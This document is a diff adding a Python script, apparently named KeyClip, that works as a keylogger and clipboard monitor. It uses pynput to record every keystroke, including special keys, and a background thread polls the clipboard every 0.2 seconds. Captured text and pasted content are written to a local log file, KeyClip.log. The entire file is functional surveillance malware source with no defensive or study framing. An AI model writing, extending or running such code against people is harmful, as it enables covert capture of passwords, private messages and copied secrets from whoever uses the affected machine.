@@ -1,0 +1,62 @@
+from pynput.keyboard import Listener
+from pyperclip import paste
+import logging
+from time import sleep
+import threading
+import re
+import clipboard
+
+
+
+logging.basicConfig(filename='KeyClip.log',level=logging.INFO,format='%(message)s')
+key=""
+def onPress(_key_):
+    _key = str(_key_)
+    global key
+    if len(_key)> 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
+            if _key == "Key.space":
+                # " " instead of "space"
+                key = key+ " "
+            elif _key == "Key.enter":
+                # add a new line whenever an ENTER is pressed
+                text = clipboard.paste()
+                logging.info('Pasted:  '+ text)
+                logging.info(key)
+                key=""
+            elif _key == "Key.caps_lock":
+                key = key+'[CAPSLOCK]'
+            elif _key =='Key.ctrl_l':
+                key= key+'[LCTRL]'
+            elif _key == 'Key.shift_r' or _key == 'Key.shift_l':
+                key= key+'[Shift]'
+            elif "\"\'\"" in _key:
+                key=key+'\''
+            else:
+                _key = _key.replace("\'",'')
+                #print(_key)
+                # replace spaces with underscores
+                key = key+_key
+            # finally, add the key name to our global `self.log` variable
+           
+    
+
+def keyLogger():
+    with Listener(on_press=onPress) as l:
+        l.join()
+
+def clipLogger():
+    prevClip = ''
+    while True:
+        clip = paste()
+        if prevClip != clip:
+            logging.info('Clip:  '+ clip)
+            prevClip = clip
+        sleep(0.2)
+
+keyThread = threading.Thread(target=keyLogger)
+clipThread = threading.Thread(target=clipLogger)
+
+keyThread.start()
+clipThread.start()
